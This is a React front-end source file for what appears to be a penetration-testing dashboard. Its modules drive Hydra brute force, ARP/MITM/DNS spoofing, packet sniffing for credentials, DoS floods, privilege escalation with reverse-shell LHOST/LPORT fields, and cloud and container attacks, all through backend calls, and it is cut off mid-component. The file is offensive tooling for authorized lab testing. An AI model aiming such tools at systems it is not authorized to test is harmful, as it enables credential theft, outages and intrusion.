        <div style={{marginBottom:10,background:"#020617",border:"1px solid #1e293b",borderRadius:6}}>
          <div onClick={()=>setAuthOpen(o=>!o)}
            style={{padding:"8px 12px",cursor:"pointer",display:"flex",justifyContent:"space-between",alignItems:"center",userSelect:"none"}}>
            <div style={{display:"flex",gap:8,alignItems:"center"}}>
              <span style={{fontSize:11}}>{authOpen?"▼":"▶"}</span>
              <span style={{fontSize:12,fontWeight:600,color:"#e2e8f0"}}>🔐 Authenticated scan (optional)</span>
              <span style={{fontSize:10,color:"#64748b"}}>— finds IDOR, priv-esc, mass-assignment, stored XSS</span>
            </div>
            {authStatus==="ok"  && <span style={{background:"#052e16",color:"#4ade80",fontSize:10,fontWeight:700,padding:"2px 8px",borderRadius:3}}>✓ session captured</span>}
            {authStatus==="fail"&& <span style={{background:"#450a0a",color:"#f87171",fontSize:10,fontWeight:700,padding:"2px 8px",borderRadius:3}}>✗ login failed</span>}
          </div>
          {authOpen && (
            <div style={{padding:"4px 12px 12px",borderTop:"1px solid #1e293b"}}>
              <div style={{display:"flex",gap:8,marginBottom:8,alignItems:"center"}}>
                <span style={{fontSize:11,color:"#94a3b8"}}>Auth type:</span>
                {["form","basic","bearer"].map(t=>(
                  <button key={t} onClick={()=>{setAuthType(t); setAuthStatus(null); setAuthCookie(""); setAuthBearer("");}}
                    style={{background:authType===t?"#1e3a8a":"#0f172a",border:"1px solid "+(authType===t?"#3b82f6":"#1e293b"),borderRadius:4,padding:"3px 10px",color:authType===t?"#93c5fd":"#94a3b8",fontSize:10,fontWeight:600,cursor:"pointer"}}>
                    {t}
                  </button>
                ))}
              </div>
              {authType==="form" && (
                <>
                  <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:8,marginBottom:8}}>
                    <input value={loginUrl} onChange={e=>setLoginUrl(e.target.value)}
                      placeholder="Login URL (e.g. /login)"
                      style={{background:"#0f172a",border:"1px solid #1e293b",borderRadius:4,padding:"8px 10px",color:"#e2e8f0",fontSize:12,fontFamily:"JetBrains Mono,monospace"}}/>
                    <input value={loginSuccessUrl} onChange={e=>setLoginSuccessUrl(e.target.value)}
                      placeholder="Post-login URL to verify (e.g. /dashboard)"
                      style={{background:"#0f172a",border:"1px solid #1e293b",borderRadius:4,padding:"8px 10px",color:"#e2e8f0",fontSize:12,fontFamily:"JetBrains Mono,monospace"}}/>
                  </div>
                  <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:8,marginBottom:8}}>
                    <input value={loginUser} onChange={e=>setLoginUser(e.target.value)}
                      placeholder="Username / email"
                      autoComplete="off"
                      style={{background:"#0f172a",border:"1px solid #1e293b",borderRadius:4,padding:"8px 10px",color:"#e2e8f0",fontSize:12,fontFamily:"JetBrains Mono,monospace"}}/>
                    <input value={loginPass} onChange={e=>setLoginPass(e.target.value)}
                      type="password" placeholder="Password" autoComplete="off"
                      style={{background:"#0f172a",border:"1px solid #1e293b",borderRadius:4,padding:"8px 10px",color:"#e2e8f0",fontSize:12,fontFamily:"JetBrains Mono,monospace"}}/>
                  </div>
                  <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:8}}>
                    <input value={loginUserField} onChange={e=>setLoginUserField(e.target.value)}
                      placeholder="(optional) username field name"
                      style={{background:"#0f172a",border:"1px solid #1e293b",borderRadius:4,padding:"8px 10px",color:"#e2e8f0",fontSize:11,fontFamily:"JetBrains Mono,monospace"}}/>
                    <input value={loginPassField} onChange={e=>setLoginPassField(e.target.value)}
                      placeholder="(optional) password field name"
                      style={{background:"#0f172a",border:"1px solid #1e293b",borderRadius:4,padding:"8px 10px",color:"#e2e8f0",fontSize:11,fontFamily:"JetBrains Mono,monospace"}}/>
                  </div>
                </>
              )}
              {authType==="basic" && (
                <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:8}}>
                  <input value={loginUser} onChange={e=>setLoginUser(e.target.value)}
                    placeholder="Username" autoComplete="off"
                    style={{background:"#0f172a",border:"1px solid #1e293b",borderRadius:4,padding:"8px 10px",color:"#e2e8f0",fontSize:12,fontFamily:"JetBrains Mono,monospace"}}/>
                  <input value={loginPass} onChange={e=>setLoginPass(e.target.value)}
                    type="password" placeholder="Password" autoComplete="off"
                    style={{background:"#0f172a",border:"1px solid #1e293b",borderRadius:4,padding:"8px 10px",color:"#e2e8f0",fontSize:12,fontFamily:"JetBrains Mono,monospace"}}/>
                </div>
              )}
              {authType==="bearer" && (
                <input value={authBearer} onChange={e=>setAuthBearer(e.target.value)}
                  placeholder="Paste bearer token (JWT or API key)" autoComplete="off"
                  style={{width:"100%",boxSizing:"border-box",background:"#0f172a",border:"1px solid #1e293b",borderRadius:4,padding:"8px 10px",color:"#e2e8f0",fontSize:12,fontFamily:"JetBrains Mono,monospace"}}/>
              )}
              <div style={{fontSize:10,color:"#64748b",marginTop:6}}>
                Credentials are sent to the scanner backend only, never stored. Session is discarded when this page reloads.
              </div>
            </div>
          )}
        </div>

        <div style={{display:"flex",gap:10,flexWrap:"wrap"}}>
          <input value={target} onChange={e=>setTarget(e.target.value)}
            onKeyDown={e=>e.key==="Enter"&&!running&&runAll()}
            placeholder="http://192.168.56.102 or http://target.com"
            style={{flex:1,minWidth:220,background:"#020617",border:"1px solid #1e293b",borderRadius:6,padding:"10px 14px",color:"#e2e8f0",fontFamily:"JetBrains Mono,monospace",fontSize:13,outline:"none"}}/>
          <button onClick={runAll} disabled={running||!target.trim()}
            style={{background:running?"#1e293b":"linear-gradient(135deg,#f59e0b,#d97706)",border:"none",borderRadius:6,padding:"10px 22px",color:running?"#475569":"#0f172a",fontSize:13,fontWeight:700,cursor:running?"not-allowed":"pointer",whiteSpace:"nowrap"}}>
            {running?"Scanning...":"▶ Run All Scans"}
          </button>
          {finished&&(
            <button onClick={()=>generateVulnReport({target,allResults,date:new Date().toLocaleDateString("en-GB",{day:"2-digit",month:"long",year:"numeric"})+" "+new Date().toLocaleTimeString("en-GB",{hour:"2-digit",minute:"2-digit"})})}
              style={{background:"#ef4444",border:"none",borderRadius:6,padding:"8px 18px",color:"#fff",fontSize:13,fontWeight:700,cursor:"pointer"}}>
              📄 Report
            </button>
          )}
        </div>
      </div>

      {/* Phase progress */}
      <div style={{display:"flex",flexDirection:"column",gap:8,marginBottom:16}}>
        {VULN_PHASES.map((ph,i)=>{
          const isDone=done.includes(i), isActive=current===i;
          const hasData=allResults[ph.tool];
          const findings=hasData?(allResults[ph.tool]?.findings||[]).filter(f=>f.severity!=="INFO"):[];
          const hi=findings.filter(f=>["CRITICAL","HIGH"].includes(f.severity)).length;
          return(
            <div key={i} onClick={()=>isDone&&setActiveTab(ph.tool)}
              style={{background:isActive?"#1e3a5f":isDone?"#0f172a":"#0a0f1a",border:`1px solid ${isActive?"#3b82f6":isDone?"#1e293b":"#0f172a"}`,borderRadius:6,padding:"8px 10px",cursor:isDone?"pointer":"default",transition:"all 0.2s"}}>
              <div style={{display:"flex",justifyContent:"space-between",alignItems:"center",marginBottom:3}}>
                <span style={{fontSize:14}}>{ph.icon}</span>
                <span style={{fontSize:10,color:isActive?"#60a5fa":isDone?(hi>0?"#f87171":"#4ade80"):"#334155",fontWeight:700}}>
                  {isActive?"⟳":isDone?(hi>0?"⚠":"✓"):"○"}
                </span>
              </div>
              <div style={{fontSize:10,color:isActive?"#93c5fd":isDone?"#cbd5e1":"#334155",fontWeight:600,lineHeight:1.3}}>{ph.name}</div>
              {isDone&&findings.length>0&&<div style={{fontSize:9,color:hi>0?"#f87171":"#94a3b8",marginTop:2}}>{findings.length} finding{findings.length!==1?"s":""}</div>}
            </div>
          );
        })}
      </div>

      {/* Terminal */}
      <div style={{marginBottom:16}}><Terminal lines={lines} height={120}/></div>

      {/* Summary bar */}
      {finished&&(
        <div style={{background:"#0f172a",border:"1px solid #1e293b",borderRadius:8,padding:"12px 16px",marginBottom:16,display:"flex",gap:16,alignItems:"center",flexWrap:"wrap"}}>
          <span style={{fontSize:13,fontWeight:700,color:"#f1f5f9"}}>Scan Complete</span>
          <span style={{background:"#dc262620",color:"#f87171",fontSize:11,fontWeight:700,padding:"3px 10px",borderRadius:4}}>{highCrit} HIGH/CRITICAL</span>
          <span style={{background:"#1e293b",color:"#94a3b8",fontSize:11,padding:"3px 10px",borderRadius:4}}>{totalFindings} total findings</span>
          <span style={{background:"#052e16",color:"#4ade80",fontSize:11,padding:"3px 10px",borderRadius:4}}>{VULN_PHASES.length} scanners run</span>
        </div>
      )}

      {/* Results tabs */}
      {finished&&activeTab&&(
        <div style={{background:"#0f172a",border:"1px solid #1e293b",borderRadius:8,overflow:"hidden"}}>
          <div style={{display:"flex",overflowX:"auto",borderBottom:"1px solid #1e293b",background:"#020617"}}>
            {VULN_PHASES.map(ph=>{
              const findings=(allResults[ph.tool]?.findings||[]).filter(f=>f.severity!=="INFO");
              const hi=findings.filter(f=>["CRITICAL","HIGH"].includes(f.severity)).length;
              return(
                <button key={ph.tool} onClick={()=>setActiveTab(ph.tool)}
                  style={{background:activeTab===ph.tool?"#0f172a":"transparent",border:"none",borderBottom:activeTab===ph.tool?"2px solid #3b82f6":"2px solid transparent",padding:"10px 14px",color:activeTab===ph.tool?"#f1f5f9":"#475569",fontSize:11,fontWeight:600,cursor:"pointer",whiteSpace:"nowrap",display:"flex",alignItems:"center",gap:5}}>
                  {ph.icon} {ph.tool}
                  {allResults[ph.tool]&&findings.length>0&&<span style={{background:hi>0?"#dc262620":"#1e293b",color:hi>0?"#f87171":"#94a3b8",fontSize:9,padding:"1px 5px",borderRadius:3}}>{findings.length}</span>}
                </button>
              );
            })}
          </div>
          <div>{renderFindings(activeTab)}</div>
        </div>
      )}
    </div>
  );
}

// ═══════════════════════════════════════════════════════════════
//  PASSWORD ATTACKS MODULE
// ═══════════════════════════════════════════════════════════════
function PasswordModule(props) {
  const token = props.token;
  const [target,setTarget]   = useState("");
  const [service,setService] = useState("ssh");
  const [userlist,setUlist]  = useState("/usr/share/wordlists/metasploit/unix_users.txt");
  const [passlist,setPlist]  = useState("/usr/share/wordlists/rockyou.txt");
  const [running,setRunning] = useState(false);
  const [result,setResult]   = useState(null);
  const [lines,setLines]     = useState(["Ready — configure target and click Start"]);
  const add = l => setLines(p=>[...p,l]);

  const dlPDF = () => generateModuleReport({
    moduleName: "Password Attack Results",
    tool: "hydra",
    toolLabel: "Hydra — Brute Force",
    target: target+(service?" ("+service+")":""),
    findings: [],
    cracked: result ? result.cracked||[] : [],
    date: new Date().toLocaleDateString("en-GB",{day:"2-digit",month:"long",year:"numeric"}),
    companyName:"VulnusLab", reporterName:"Security Analyst",
    reporterRole:"Penetration Tester", template:"red",
  });

  const run = async() => {
    if(!target.trim()) return;
    setRunning(true); setResult(null);
    setLines([`[*] Starting Hydra brute force on ${target} (${service})...`]);
    add("[!] WARNING: Only use on systems you own or have permission to test");
    try {
      const data = await api("/api/scan/hydra","POST",{target,scan_type:"full",options:{service,userlist,passlist}},token);
      setResult(data);
      if(data.cracked && data.cracked.length>0){
        add(`[✓] CRACKED! Found ${data.cracked.length} credential(s)!`);
        data.cracked.forEach(c=>add(`[✓] Login: ${c.username} | Password: ${c.password}`));
      } else {
        add("[*] No credentials cracked with provided wordlists");
      }
    } catch(e){ add(`[✗] Error: ${e.message}`); }
    setRunning(false);
  };

  const services = ["ssh","ftp","http-get","http-post-form","mysql","rdp","smtp","telnet","vnc","pop3","imap"];

  return (
    <div className="fade">
      <div style={{background:"#0f172a",border:"1px solid #1e293b",borderRadius:8,padding:20,marginBottom:16}}>
        <h2 style={{fontSize:15,fontWeight:600,color:"#f1f5f9",marginBottom:4}}>🔑 Password Attacks — Hydra</h2>
        <p style={{fontSize:12,color:"#64748b",marginBottom:10}}>Brute force login credentials — authorized use only</p>
        <TestTargets onSelect={setTarget} targets={[
          {icon:"🏠",label:"Kali VM SSH",               value:"192.168.56.102",            desc:"SSH on your local Kali VM (service: SSH)"},
          {icon:"🌐",label:"DVWA HTTP Form",             value:"192.168.56.102",            desc:"Use service: http-post-form for DVWA login"},
          {icon:"🐧",label:"Metasploitable2 SSH",        value:"192.168.56.101",            desc:"Classic vulnerable VM — default creds: msfadmin"},
          {icon:"🔴",label:"Metasploitable2 FTP",        value:"192.168.56.101",            desc:"FTP with anonymous login enabled"},
          {icon:"🛢️",label:"Metasploitable2 MySQL",     value:"192.168.56.101",            desc:"MySQL with weak root password"},
        ]}/>
        <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:10,marginBottom:10}}>
          <div>
            <label style={{fontSize:10,color:"#475569",fontWeight:600,display:"block",marginBottom:4,textTransform:"uppercase",letterSpacing:1}}>Target IP/Host</label>
            <input value={target} onChange={e=>setTarget(e.target.value)}
              placeholder="192.168.1.1 or target.com"
              style={{width:"100%",background:"#020617",border:"1px solid #1e293b",borderRadius:6,padding:"10px 12px",color:"#e2e8f0",fontFamily:"JetBrains Mono,monospace",fontSize:13,outline:"none",boxSizing:"border-box"}}/>
          </div>
          <div>
            <label style={{fontSize:10,color:"#475569",fontWeight:600,display:"block",marginBottom:4,textTransform:"uppercase",letterSpacing:1}}>Service</label>
            <select value={service} onChange={e=>setService(e.target.value)}
              style={{width:"100%",background:"#020617",border:"1px solid #1e293b",borderRadius:6,padding:"10px 12px",color:"#e2e8f0",fontSize:13,outline:"none"}}>
              {services.map(s=><option key={s} value={s}>{s.toUpperCase()}</option>)}
            </select>
          </div>
          <div>
            <label style={{fontSize:10,color:"#475569",fontWeight:600,display:"block",marginBottom:4,textTransform:"uppercase",letterSpacing:1}}>Username List</label>
            <input value={userlist} onChange={e=>setUlist(e.target.value)}
              style={{width:"100%",background:"#020617",border:"1px solid #1e293b",borderRadius:6,padding:"10px 12px",color:"#e2e8f0",fontFamily:"JetBrains Mono,monospace",fontSize:11,outline:"none",boxSizing:"border-box"}}/>
          </div>
          <div>
            <label style={{fontSize:10,color:"#475569",fontWeight:600,display:"block",marginBottom:4,textTransform:"uppercase",letterSpacing:1}}>Password List</label>
            <input value={passlist} onChange={e=>setPlist(e.target.value)}
              style={{width:"100%",background:"#020617",border:"1px solid #1e293b",borderRadius:6,padding:"10px 12px",color:"#e2e8f0",fontFamily:"JetBrains Mono,monospace",fontSize:11,outline:"none",boxSizing:"border-box"}}/>
          </div>
        </div>
        <div style={{background:"#1c1000",border:"1px solid #78350f",borderRadius:6,padding:"8px 12px",marginBottom:12,fontSize:11,color:"#d97706"}}>
          ⚠ WARNING: Only use on systems you own or have written permission to test. Unauthorized use is illegal.
        </div>
        <button onClick={run} disabled={running||!target.trim()}
          style={{background:running?"#1e293b":"linear-gradient(135deg,#7c3aed,#a855f7)",border:"none",borderRadius:6,padding:"10px 24px",color:running?"#475569":"#fff",fontSize:13,fontWeight:700,cursor:running?"not-allowed":"pointer"}}>
          {running?"Attacking...":"Start Brute Force"}
        </button>
      </div>

      <div style={{marginBottom:16}}><Terminal lines={lines} height={120}/></div>

      {result && result.cracked && result.cracked.length>0 && (
        <div style={{background:"#0f172a",border:"1px solid #dc2626",borderRadius:8,overflow:"hidden"}}>
          <div style={{padding:"12px 16px",borderBottom:"1px solid #1e293b",background:"#1c0a0a",display:"flex",justifyContent:"space-between",alignItems:"center"}}>
            <span style={{fontSize:13,fontWeight:600,color:"#ef4444"}}>Credentials Cracked!</span>
            <button onClick={dlPDF}
              style={{background:"#ef4444",border:"none",borderRadius:6,padding:"8px 18px",color:"#fff",fontSize:13,fontWeight:700,cursor:"pointer"}}>
              📄 Report
            </button>
          </div>
          {result.cracked.map((c,i)=>(
            <div key={i} style={{padding:"12px 16px",borderBottom:"1px solid #0f172a",display:"flex",gap:16}}>
              <div><span style={{fontSize:10,color:"#475569"}}>USERNAME</span><div style={{fontSize:13,color:"#ef4444",fontFamily:"monospace",fontWeight:700}}>{c.username}</div></div>
              <div><span style={{fontSize:10,color:"#475569"}}>PASSWORD</span><div style={{fontSize:13,color:"#ef4444",fontFamily:"monospace",fontWeight:700}}>{c.password}</div></div>
            </div>
          ))}
        </div>
      )}
    </div>
  );
}

// ═══════════════════════════════════════════════════════════════
//  NETWORK ATTACKS MODULE
// ═══════════════════════════════════════════════════════════════
function NetworkAttacksModule({token}) {
  const API = getApiUrl();
  const [target,    setTarget]    = useState("");
  const [gateway,   setGateway]   = useState("");
  const [iface,     setIface]     = useState("eth0");
  const [protocol,  setProtocol]  = useState("syn");
  const [duration,  setDuration]  = useState(10);
  const [loading,   setLoading]   = useState("");
  const [results,   setResults]   = useState({});

  const attacks = [
    {id:"scan",      label:"Network Scan",     icon:"🔭", ep:"/api/network/scan",     desc:"Nmap scan for open ports and risky services"},
    {id:"arp",       label:"ARP Scan / Spoof", icon:"📡", ep:"/api/network/arp",      desc:"Discover live hosts and generate arpspoof commands"},
    {id:"mitm",      label:"MITM Setup",       icon:"🕵️", ep:"/api/network/mitm",     desc:"Check IP forwarding, ettercap, mitmproxy availability"},
    {id:"sniff",     label:"Packet Sniffer",   icon:"🦈", ep:"/api/network/sniff",    desc:"Capture packets with tcpdump, detect cleartext creds"},
    {id:"flood",     label:"DoS Flood",        icon:"💥", ep:"/api/network/flood",    desc:"Generate SYN/UDP/ICMP flood commands (hping3)"},
    {id:"dns_spoof", label:"DNS Spoofing",     icon:"🌀", ep:"/api/network/dns_spoof",desc:"DNS spoofing via dnschef/responder"},
  ];

  const run = async (atk) => {
    setLoading(atk.id);
    try {
      const body = {target, gateway, interface: iface, protocol, duration: parseInt(duration)||10, port: 80};
      const r = await fetch(`${API}${atk.ep}`, {
        method:"POST", headers:{"Content-Type":"application/json","Authorization":`Bearer ${token}`},
        body: JSON.stringify(body)
      });
      if (!r.ok) {
        let detail = `HTTP ${r.status}`;
        try { const j = await r.json(); detail = j.detail || j.error || detail; } catch {}
        setResults(prev=>({...prev, [atk.id]:{error: detail, status: r.status}}));
      } else {
        const data = await r.json();
        setResults(prev=>({...prev, [atk.id]: data}));
      }
    } catch(e) { setResults(prev=>({...prev, [atk.id]:{error:e.message}})); }
    setLoading("");
  };

  const sevColor = s=>({CRITICAL:"#ef4444",HIGH:"#f97316",MEDIUM:"#eab308",LOW:"#22c55e",INFO:"#60a5fa"}[s]||"#94a3b8");
  const inp = (label,val,set,ph,mono)=>(
    <div>
      <div style={{fontSize:11,color:"#64748b",marginBottom:4}}>{label}</div>
      <input value={val} onChange={e=>set(e.target.value)} placeholder={ph}
        style={{width:"100%",background:"#1e293b",border:"1px solid #334155",borderRadius:6,
          padding:"8px 12px",color:"#f8fafc",fontSize:12,fontFamily:mono?"monospace":"inherit",boxSizing:"border-box"}}/>
    </div>
  );

  return (
    <div style={{padding:24,maxWidth:1100,margin:"0 auto"}}>
      <div style={{background:"#0f172a",borderRadius:12,padding:20,marginBottom:24,border:"1px solid #1e293b"}}>
        <div style={{fontSize:20,fontWeight:700,color:"#f8fafc",marginBottom:16}}>Network Attacks</div>
        <div style={{display:"grid",gridTemplateColumns:"1fr 1fr 1fr",gap:12,marginBottom:12}}>
          {inp("TARGET IP / RANGE",target,setTarget,"192.168.56.101 or 192.168.56.0/24")}
          {inp("GATEWAY IP",gateway,setGateway,"192.168.56.1 (for MITM/ARP)")}
          {inp("INTERFACE",iface,setIface,"eth0")}
        </div>
        <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:12}}>
          <div>
            <div style={{fontSize:11,color:"#64748b",marginBottom:4}}>FLOOD PROTOCOL</div>
            <select value={protocol} onChange={e=>setProtocol(e.target.value)}
              style={{width:"100%",background:"#1e293b",border:"1px solid #334155",borderRadius:6,
                padding:"8px 12px",color:"#f8fafc",fontSize:12}}>
              <option value="syn">SYN Flood</option>
              <option value="udp">UDP Flood</option>
              <option value="icmp">ICMP Flood</option>
            </select>
          </div>
          {inp("SNIFF DURATION (sec)",String(duration),setDuration,"10")}
        </div>
      </div>
      <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:16}}>
        {attacks.map(atk=>{
          const res=results[atk.id]; const busy=loading===atk.id;
          return (
            <div key={atk.id} style={{background:"#0f172a",border:"1px solid #1e293b",borderRadius:12,overflow:"hidden"}}>
              <div style={{padding:"14px 18px",borderBottom:"1px solid #1e293b",display:"flex",justifyContent:"space-between",alignItems:"center"}}>
                <div>
                  <div style={{fontSize:14,fontWeight:700,color:"#f8fafc"}}>{atk.icon} {atk.label}</div>
                  <div style={{fontSize:11,color:"#64748b",marginTop:2}}>{atk.desc}</div>
                </div>
                <button onClick={()=>run(atk)} disabled={busy}
                  style={{background:busy?"#1e293b":"#0891b2",color:"#f8fafc",border:"none",
                    borderRadius:8,padding:"7px 14px",cursor:busy?"not-allowed":"pointer",fontSize:12,fontWeight:600}}>
                  {busy?"Running...":"Run"}
                </button>
              </div>
              {res&&<div style={{padding:14}}>
                {res.error&&<div style={{color:"#ef4444",fontSize:12}}>{res.error}</div>}
                {res.commands&&<div style={{marginBottom:8}}>
                  <div style={{fontSize:11,color:"#64748b",marginBottom:6}}>Commands:</div>
                  {Object.entries(res.commands).map(([k,v])=>(
                    <div key={k} style={{marginBottom:4}}>
                      <div style={{fontSize:10,color:"#94a3b8"}}>{k}:</div>
                      <code style={{display:"block",background:"#020617",color:"#86efac",fontSize:10,
                        padding:"4px 8px",borderRadius:4,overflowX:"auto",whiteSpace:"pre"}}>{v}</code>
                    </div>
                  ))}
                </div>}
                {res.findings&&res.findings.map((f,i)=>(
                  <div key={i} style={{background:"#1e293b",borderRadius:6,padding:10,marginBottom:6,
                    borderLeft:`3px solid ${sevColor(f.severity)}`}}>
                    <span style={{background:sevColor(f.severity),color:"#000",fontSize:10,
                      fontWeight:700,padding:"1px 5px",borderRadius:3,marginRight:6}}>{f.severity}</span>
                    <span style={{fontSize:11,color:"#e2e8f0"}}>{f.detail}</span>
                  </div>
                ))}
                {res.raw_output&&<details style={{marginTop:6}}>
                  <summary style={{color:"#64748b",fontSize:11,cursor:"pointer"}}>Raw Output</summary>
                  <pre style={{background:"#020617",color:"#94a3b8",fontSize:10,padding:8,
                    borderRadius:4,maxHeight:120,overflow:"auto",marginTop:4}}>{res.raw_output}</pre>
                </details>}
              </div>}
            </div>
          );
        })}
      </div>
    </div>
  );
}

// ═══════════════════════════════════════════════════════════════
//  SYSTEM EXPLOITATION MODULE
// ═══════════════════════════════════════════════════════════════
function SystemExploitModule({token}) {
  const API = getApiUrl();
  const [target, setTarget] = useState("");
  const [lhost,  setLhost]  = useState("");
  const [lport,  setLport]  = useState("4444");
  const [loading,setLoading]= useState("");
  const [results,setResults]= useState({});

  const attacks = [
    {id:"privesc_linux", label:"Linux PrivEsc",    icon:"🐧", ep:"/api/exploit/privesc_linux", desc:"LinPEAS: SUID, sudo, cron, kernel exploits"},
    {id:"privesc_win",   label:"Windows PrivEsc",  icon:"🪟", ep:"/api/exploit/privesc_win",   desc:"WinPEAS: unquoted paths, AlwaysInstallElevated, tokens"},
    {id:"suid",          label:"SUID Exploits",    icon:"🔑", ep:"/api/exploit/suid",           desc:"Find SUID binaries with GTFOBins exploit commands"},
    {id:"formatstring",  label:"Format String",    icon:"📝", ep:"/api/exploit/formatstring",   desc:"Detect format string vulnerabilities in web params"},
    {id:"dllhijack",     label:"DLL Hijacking",    icon:"💻", ep:"/api/exploit/dllhijack",      desc:"Find DLL hijacking opportunities on Windows targets"},
  ];

  const run = async(atk)=>{
    setLoading(atk.id);
    try {
      const body = atk.id.includes("format") ? {target} :
        {target, lhost, lport:parseInt(lport)||4444, platform: atk.id.includes("win")?"windows":"linux"};
      const r = await fetch(`${API}${atk.ep}`,{method:"POST",
        headers:{"Content-Type":"application/json","Authorization":`Bearer ${token}`},
        body:JSON.stringify(body)});
      if (!r.ok) {
        let detail = `HTTP ${r.status}`;
        try { const j = await r.json(); detail = j.detail || j.error || detail; } catch {}
        setResults(prev=>({...prev,[atk.id]:{error: detail, status: r.status}}));
      } else {
        const data = await r.json();
        setResults(prev=>({...prev,[atk.id]:data}));
      }
    } catch(e){setResults(prev=>({...prev,[atk.id]:{error:e.message}}));}
    setLoading("");
  };

  const sevColor=s=>({CRITICAL:"#ef4444",HIGH:"#f97316",MEDIUM:"#eab308",LOW:"#22c55e",INFO:"#60a5fa"}[s]||"#94a3b8");

  return (
    <div style={{padding:24,maxWidth:1100,margin:"0 auto"}}>
      <div style={{background:"#0f172a",borderRadius:12,padding:20,marginBottom:24,border:"1px solid #1e293b"}}>
        <div style={{fontSize:20,fontWeight:700,color:"#f8fafc",marginBottom:16}}>System / Exploitation Attacks</div>
        <div style={{display:"grid",gridTemplateColumns:"1fr 1fr 1fr",gap:12}}>
          {["TARGET","LHOST (Kali IP)","LPORT"].map((label,i)=>(
            <div key={i}>
              <div style={{fontSize:11,color:"#64748b",marginBottom:4}}>{label}</div>
              <input value={[target,lhost,lport][i]}
                onChange={e=>[setTarget,setLhost,setLport][i](e.target.value)}
                placeholder={["192.168.56.101 or URL","192.168.56.102","4444"][i]}
                style={{width:"100%",background:"#1e293b",border:"1px solid #334155",borderRadius:6,
                  padding:"8px 12px",color:"#f8fafc",fontSize:12,boxSizing:"border-box"}}/>
            </div>
          ))}
        </div>
      </div>
      <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:16}}>
        {attacks.map(atk=>{
          const res=results[atk.id]; const busy=loading===atk.id;
          return (
            <div key={atk.id} style={{background:"#0f172a",border:"1px solid #1e293b",borderRadius:12,overflow:"hidden"}}>
              <div style={{padding:"14px 18px",borderBottom:"1px solid #1e293b",display:"flex",justifyContent:"space-between",alignItems:"center"}}>
                <div>
                  <div style={{fontSize:14,fontWeight:700,color:"#f8fafc"}}>{atk.icon} {atk.label}</div>
                  <div style={{fontSize:11,color:"#64748b",marginTop:2}}>{atk.desc}</div>
                </div>
                <button onClick={()=>run(atk)} disabled={busy}
                  style={{background:busy?"#1e293b":"#7c3aed",color:"#f8fafc",border:"none",
                    borderRadius:8,padding:"7px 14px",cursor:busy?"not-allowed":"pointer",fontSize:12,fontWeight:600}}>
                  {busy?"Running...":"Run"}
                </button>
              </div>
              {res&&<div style={{padding:14}}>
                {res.error&&<div style={{color:"#ef4444",fontSize:12}}>{res.error}</div>}
                {res.exploitable&&res.exploitable.length>0&&<div style={{marginBottom:8}}>
                  <div style={{fontSize:11,color:"#f97316",fontWeight:700,marginBottom:4}}>Exploitable SUID Binaries:</div>
                  {res.exploitable.map((b,i)=>(
                    <div key={i} style={{background:"#1e293b",borderRadius:6,padding:8,marginBottom:4}}>
                      <code style={{color:"#ef4444",fontSize:11}}>{b.binary}</code>
                      <div style={{fontSize:10,color:"#86efac",marginTop:2,fontFamily:"monospace"}}>{b.exploit}</div>
                    </div>
                  ))}
                </div>}
                {res.commands&&<div style={{marginBottom:8}}>
                  <div style={{fontSize:11,color:"#64748b",marginBottom:6}}>Commands:</div>
                  {Object.entries(res.commands).slice(0,5).map(([k,v])=>(
                    <div key={k} style={{marginBottom:4}}>
                      <div style={{fontSize:10,color:"#94a3b8"}}>{k}:</div>
                      <code style={{display:"block",background:"#020617",color:"#86efac",fontSize:10,
                        padding:"4px 8px",borderRadius:4,overflowX:"auto",whiteSpace:"pre"}}>{v}</code>
                    </div>
                  ))}
                </div>}
                {res.findings&&res.findings.map((f,i)=>(
                  <div key={i} style={{background:"#1e293b",borderRadius:6,padding:10,marginBottom:6,
                    borderLeft:`3px solid ${sevColor(f.severity)}`}}>
                    <span style={{background:sevColor(f.severity),color:"#000",fontSize:10,
                      fontWeight:700,padding:"1px 5px",borderRadius:3,marginRight:6}}>{f.severity}</span>
                    <span style={{fontSize:11,color:"#e2e8f0"}}>{f.detail}</span>
                  </div>
                ))}
              </div>}
            </div>
          );
        })}
      </div>
    </div>
  );
}

// ═══════════════════════════════════════════════════════════════
//  CLOUD ATTACKS MODULE
// ═══════════════════════════════════════════════════════════════
function CloudAttacksModule({token}) {
  const API = getApiUrl();
  const [target, setTarget]  = useState("");
  const [bucket, setBucket]  = useState("");
  const [region, setRegion]  = useState("us-east-1");
  const [loading,setLoading] = useState("");
  const [results,setResults] = useState({});

  const attacks = [
    {id:"s3",           label:"S3 Bucket Scanner",   icon:"🪣", ep:"/api/cloud/s3",           desc:"Test S3 bucket for public access and file listing"},
    {id:"iam",          label:"IAM Privilege Check",  icon:"🔐", ep:"/api/cloud/iam",          desc:"Enumerate IAM permissions and exposed credentials"},
    {id:"docker",       label:"Container Escape",     icon:"🐳", ep:"/api/cloud/docker",       desc:"Detect privileged containers and Docker socket exposure"},
    {id:"k8s",          label:"Kubernetes Attack",    icon:"☸️", ep:"/api/cloud/k8s",          desc:"Check K8s API access, RBAC misconfigs, pod escape"},
    {id:"apiabusecheck",label:"API Abuse Check",      icon:"⚙️", ep:"/api/cloud/apiabusecheck",desc:"Rate limit testing, exposed API docs, token leakage"},
  ];

  const run = async(atk)=>{
    setLoading(atk.id);
    try {
      const r = await fetch(`${API}${atk.ep}`,{method:"POST",
        headers:{"Content-Type":"application/json","Authorization":`Bearer ${token}`},
        body:JSON.stringify({target, bucket, region})});
      if (!r.ok) {
        let detail = `HTTP ${r.status}`;
        try { const j = await r.json(); detail = j.detail || j.error || detail; } catch {}
        setResults(prev=>({...prev,[atk.id]:{error: detail, status: r.status}}));
      } else {
        const data = await r.json();
        setResults(prev=>({...prev,[atk.id]:data}));
      }
    } catch(e){setResults(prev=>({...prev,[atk.id]:{error:e.message}}));}
    setLoading("");
  };

  const sevColor=s=>({CRITICAL:"#ef4444",HIGH:"#f97316",MEDIUM:"#eab308",LOW:"#22c55e",INFO:"#60a5fa"}[s]||"#94a3b8");

  return (
    <div style={{padding:24,maxWidth:1100,margin:"0 auto"}}>
      <div style={{background:"#0f172a",borderRadius:12,padding:20,marginBottom:24,border:"1px solid #1e293b"}}>
